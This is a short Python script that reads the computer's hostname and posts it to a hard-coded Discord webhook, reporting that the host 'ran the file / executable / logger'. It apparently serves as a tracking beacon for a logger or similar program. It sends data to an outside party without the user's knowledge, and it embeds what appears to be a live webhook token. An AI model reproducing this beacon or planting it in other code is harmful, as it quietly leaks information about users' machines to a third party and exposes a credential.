import requests
import socket
hostname = socket.gethostname()

def send_message_to_webhook(webhook_url, message):
    data = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, json=data, headers=headers)

    if response.status_code == 200:
        print(f'ok')

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/1411686250821455942/l1abfayKh_1X2-11itaid2BVWrt3f0ylcYTZQ7f6RUxQYcTSsZrLkT_mn_bdZ1Udie-c'
    message_to_send = f'{hostname} ran the file / executable / logger.'

    send_message_to_webhook(webhook_url, message_to_send)
